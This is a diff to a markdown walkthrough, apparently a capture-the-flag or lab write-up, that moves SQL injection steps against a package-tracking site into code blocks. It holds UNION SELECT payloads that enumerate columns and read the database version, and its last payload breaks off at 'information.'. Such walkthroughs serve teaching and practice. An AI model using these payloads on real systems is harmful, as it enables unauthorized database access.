@@ -10,16 +10,20 @@ The system displayed the tracking website that has the illegal package's trackin
 
 5. Enter the id with SQL syntax below
     
-    -1' UNION SELECT null,null,null,null,null,null-- 
-    (Note: Insert space after last dash)
+```
+-1' UNION SELECT null,null,null,null,null,null-- 
+```
 
 6. It will show result with no data.
 7. Insert @@version on one of the null will give the current version of the database.
 
-    -1' UNION SELECT null,null,null,null,null,@@version-- 
-    (Note: Insert space after last dash)
+```
+-1' UNION SELECT null,null,null,null,null,@@version-- 
+```
 
 8. After get the version and what type of the database, we can figure out how their syntax to enter. Enter next command:
 
-    -1' UNION SELECT null,null,null,null,null,information.-- 
-    (Note: Insert space after last dash)
+```
+-1' UNION SELECT null,null,null,null,null,information.-- 
+```
+
